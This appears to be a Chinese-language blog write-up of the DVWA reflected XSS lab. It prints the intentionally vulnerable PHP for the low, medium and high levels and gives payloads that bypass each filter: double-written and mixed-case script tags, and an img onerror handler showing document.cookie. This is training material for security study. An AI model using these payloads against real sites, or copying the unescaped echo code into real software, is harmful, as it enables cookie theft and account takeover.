---
title: DVWA--xss_reflected
date: 2019-11-14 19:14:53
tags: [xss攻击]
categories: xss攻击
---

DVWA上的反射型xss。

<!--more-->

## 级别：low

### Reflected XSS Source

```php

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Feedback for end user
    echo '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
}

?>
```

### 分析

 可以看到，代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞 。

 输入

```
<script>alert('xss')</script>
```

![MNT1gJ.png](https://s2.ax1x.com/2019/11/14/MNT1gJ.png)

查看源码可以发现代码被解释执行了

![MNTa4O.png](https://s2.ax1x.com/2019/11/14/MNTa4O.png)

### 获取cookie

输入

```
<script>alert(document.cookie)</script>
```

![MNTxxJ.png](https://s2.ax1x.com/2019/11/14/MNTxxJ.png)

## 级别：medium

### Reflected XSS Source

```php

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = str_replace( '<script>', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### 分析

 Medium级别的代码相对于Low级别的代码使用`str_replace`函数将输入中的`<script>`删除 

### 方法

1.  使用双写绕过，输入 `<scr<script>ipt>alert(document.cookie)</script>` 
2.  使用大小写绕过，输入 ` <sCript>alert(document.cookie)</script> `
3.  输入其他标签，如`  <IMG src=1 onerror=alert(document.cookie)> `

结果：

![MNH1mR.png](https://s2.ax1x.com/2019/11/14/MNH1mR.png)

## 级别：high

### Reflected XSS Source

```php

<?php

header ("X-XSS-Protection: 0");

// Is there any input?
if( array_key_exists( "name", $_GET ) && $_GET[ 'name' ] != NULL ) {
    // Get input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );

    // Feedback for end user
    echo "<pre>Hello ${name}</pre>";
}

?>
```

### 分析

 可以看到High级别的代码使用了  `preg_replace ` 函数执行一个正则表达式的搜索和替换,其中 ` /<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i ` 是正则表达式 ` (.*) ` 表示贪婪匹配，`  /i ` 表示不区分大小写所以在High级别的代码中，所有关于  ` <script>  ` 标签均被过滤删除了 

### 方法

`<script>` 标签不管用了，但是可以使用其他标签绕过 

输入

```
<IMG src=1 onerror=alert(document.cookie)>
```

![MNbeHI.png](https://s2.ax1x.com/2019/11/14/MNbeHI.png)

